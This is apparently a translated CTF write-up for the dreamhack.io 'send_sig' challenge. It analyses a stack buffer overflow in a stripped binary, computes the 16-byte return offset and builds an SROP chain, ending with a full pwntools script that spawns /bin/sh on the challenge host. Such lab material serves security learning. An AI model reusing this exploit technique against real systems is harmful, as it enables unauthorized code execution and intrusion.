# dreamhack.io: send_sig

> Originally published on [Naver Blog](https://blog.naver.com/chaeeunhur630/224285349276). Translated and reformatted in English.

1. Problem overview

The problem description is as follows:

This is a program that can send a signal to the server!
Find program vulnerabilities, exploit them, and read flags.
The flag is in /home/send_sig/flag.txt.


When you run the program for the first time, the following screen is displayed.
++++++++++++++++++Welcome to dreamhack++++++++++++++++++
+ You can send a signal to dreamhack server. +
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Signal:

Since the problem name is send_sig and the input prompt is Signal:, it initially appears to be a problem of simply sending a specific signal number.

However, if you analyze the binary, the actual core is stack buffer overflow and SROP (Sigreturn Oriented Programming).

2. Vulnerability analysis

The binary was stripped, so the main symbol was not visible.

So I checked the main code through disassembly.

The important function parts are as follows.

4010ba: 55 push rbp
4010bb: 48 89 e5 mov rbp, rsp
4010be: 48 83 ec 10 sub rsp, 16

4010c2: ba 07 00 00 00 mov edx, 7
4010c7: 48 8d 35 3a 0f 00 00 lea rsi, [rip + 3898] # 0x402008
4010ce: bf 01 00 00 00 mov edi, 1
4010d8: e8 73 ff ff ff call write

4010dd: 48 8d 45 f8 lea rax, [rbp - 8]
4010e1: ba 00 04 00 00 mov edx, 1024
4010e6: 48 89 c6 mov rsi, rax
4010e9: bf 00 00 00 00 mov edi, 0
4010f3: e8 68 ff ff ff call read

4010f9: c9 leave
4010fa: c3 ret

If you interpret this part like C code, it is roughly as follows.

void vuln() {
 char buf[8];

 write(1, "Signal:", 7);
 read(0, buf, 1024);
}

Here, buf is located at rbp - 0x8.

lea rax, [rbp - 8]

However, read() accepts a maximum of 1024 bytes as input.

mov edx, 1024

call read

In other words, a stack buffer overflow occurs when 1024 bytes are input into an 8-byte buffer.

3. Find Offset

The most important part of this problem is finding the offset to the return address. The input buffer is located at:

buf = rbp - 0x8

The stack structure of the function is as follows:

.

rbp - 0x8 → start of input buffer

rbp → saved rbp

rbp + 0x8 → return address

What we want to cover is the return address, so we calculate the distance from the start of the input buffer to the return address.

return address - buf

= (rbp + 0x8) - (rbp - 0x8)

= 0x10

= 16 bytes

Therefore, the RIP offset is 16 bytes.

The input value is entered as follows.

Input 0 to 7 bytes → buf

Input 8~15 bytes → saved rbp

Input 16 to 23 bytes → return address

Therefore, the basic structure of payload is as follows.

payload = b"A" * 16 + p64(address to overwrite)

4. Check /bin/sh string

I checked the strings in the binary with the strings command.

strings -a -t x ./send_sig

Among the results, the /bin/sh string was present.

2000 /bin/sh

2008 Signal:

Since the binary is No PIE, the address of .rodata is fixed.

Therefore, the actual address of the /bin/sh string can be used as follows.

/bin/sh = 0x402000

5. SROP concept

SROP is a technique that manipulates register values at once using the rt_sigreturn syscall. The important syscall numbers in Linux x86-64 are as follows:

rt_sigreturn = 15

execve = 59

We first set rax to 15 and then run the syscall.

rax = 15

syscall

Then, the kernel reads the fake sigreturn frame currently in the stack and restores the registers with the values contained therein. If you put the following values inside this fake frame:

rax = 59

rdi = 0x402000

rsi = 0

rdx = 0

rip = 0x4010b0

Finally, the following syscall is executed. execve("/bin/sh", 0, 0); In other words, you can get the shell.

6. Create Exploit

The final exploit code is as follows.

from pwn import *

context.arch = "amd64"

HOST = "host8.dreamhack.games"
PORT = 9132

pop_rax_ret = 0x4010ae
syscall_ret = 0x4010b0
bin_sh = 0x402000

p = remote(HOST, PORT)

frame = SigreturnFrame()
frame.rax = 59 # execve
frame.rdi = bin_sh # "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

payload = b"A" * 16
payload += p64(pop_rax_ret)
payload += p64(15) # rt_sigreturn
payload += p64(syscall_ret)
payload += bytes(frame)

p.sendafter(b"Signal:", payload)

p.sendline(b"cat /home/send_sig/flag.txt")
p.interactive()

7. Payload structure summary

The payload has the following structure.

"A" * 16
→ padding to reach the return address

pop rax ; ret
→ gadget for manipulating rax values

15
→ rt_signreturn syscall number

syscall ; ret
→ Run rt_sigreturn

fake sign turn frame
→ Register status for executing execve("/bin/sh", 0, 0)

The following values are entered into the fake sigreturn frame.

rax = 59 # execve
rdi = 0x402000 # "/bin/sh"
rsi = 0
rdx = 0
rip = 0x4010b0 # syscall ; ret
